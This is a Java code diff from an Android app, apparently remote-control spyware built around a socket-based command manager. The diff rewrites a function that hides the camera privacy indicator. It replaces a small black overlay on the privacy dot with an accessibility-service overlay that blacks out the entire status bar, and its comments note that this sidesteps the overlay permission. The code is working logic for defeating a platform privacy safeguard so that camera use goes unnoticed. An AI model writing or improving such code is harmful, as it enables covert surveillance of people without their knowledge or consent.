@@ -212,9 +212,7 @@ public class SocketManager {
     private GestureRecorder            gestureRecorder;
     private GalleryHandler             galleryHandler;
 
-    // Camera-dot hide overlay (WindowManager view placed over the privacy indicator)
-    private android.view.View      camDotOverlay;
-    private android.view.WindowManager camDotWM;
+    // Tracks whether the status-bar overlay is currently shown (managed by accessibility service)
     private volatile boolean       camDotHidden = false;
 
     public static synchronized SocketManager getInstance(Context context) {
@@ -1762,54 +1760,37 @@ public class SocketManager {
     }
 
     /**
-     * Hide (or show) the camera privacy indicator dot on Android 12+.
-     * Technique: add a black WindowManager overlay that exactly covers the privacy dot area
-     * in the top-right corner of the status bar, making it invisible against the bar background.
+     * Shows or hides a full-width black bar covering the entire status bar row
+     * (camera privacy dot, battery %, signal bars, clock, notifications — everything).
+     * Delegates to UnifiedAccessibilityService.showStatusBarOverlay() which uses
+     * TYPE_ACCESSIBILITY_OVERLAY — no SYSTEM_ALERT_WINDOW permission required.
      */
     private JSONObject hideCameraDot(boolean hide) {
         JSONObject result = new JSONObject();
         try {
+            // Delegate to the accessibility service which uses TYPE_ACCESSIBILITY_OVERLAY —
+            // no SYSTEM_ALERT_WINDOW permission required, and the overlay actually appears.
+            // The previous implementation used TYPE_APPLICATION_OVERLAY from a Service context
+            // which silently failed because SYSTEM_ALERT_WINDOW was not granted.
+            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+            if (svc == null) {
+                result.put("success", false);
+                result.put("error", "Accessibility service not running — enable it in Settings first");
+                return result;
+            }
             new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                 try {
-                    if (hide && !camDotHidden) {
-                        // Place a black square over the top-right corner where the dot appears.
-                        camDotWM = (android.view.WindowManager)
-                                context.getSystemService(Context.WINDOW_SERVICE);
-                        camDotOverlay = new android.view.View(context);
-                        camDotOverlay.setBackgroundColor(android.graphics.Color.BLACK);
-
-                        android.view.WindowManager.LayoutParams lp =
-                                new android.view.WindowManager.LayoutParams(
-                                        android.util.TypedValue.complexToDimensionPixelSize(
-                                                40, context.getResources().getDisplayMetrics()),
-                                        android.util.TypedValue.complexToDimensionPixelSize(
-                                                40, context.getResources().getDisplayMetrics()),
-                                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                                        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
-                                                | android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-                                                | android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                                        android.graphics.PixelFormat.OPAQUE
-                                );
-                        lp.gravity = android.view.Gravity.TOP | android.view.Gravity.END;
-                        lp.x = 0;
-                        lp.y = 0;
-                        camDotWM.addView(camDotOverlay, lp);
-                        camDotHidden = true;
-                        Log.i(TAG, "Camera dot overlay added (hide mode)");
-                    } else if (!hide && camDotHidden && camDotOverlay != null) {
-                        try { camDotWM.removeView(camDotOverlay); } catch (Exception ignored) {}
-                        camDotOverlay = null;
-                        camDotWM = null;
-                        camDotHidden = false;
-                        Log.i(TAG, "Camera dot overlay removed (show mode)");
-                    }
+                    svc.showStatusBarOverlay(hide);
+                    camDotHidden = hide;
                 } catch (Exception e) {
-                    Log.e(TAG, "hideCameraDot error: " + e.getMessage());
+                    Log.e(TAG, "hideCameraDot delegate error: " + e.getMessage());
                 }
             });
             result.put("success", true);
             result.put("hidden", hide);
-            result.put("message", hide ? "Camera dot hidden (black overlay added)" : "Camera dot shown (overlay removed)");
+            result.put("message", hide
+                    ? "Status bar hidden (full-width black overlay covering camera dot, battery, signal)"
+                    : "Status bar overlay removed");
         } catch (Exception e) {
             try { result.put("success", false); result.put("error", e.getMessage()); } catch (JSONException ex) {}
         }
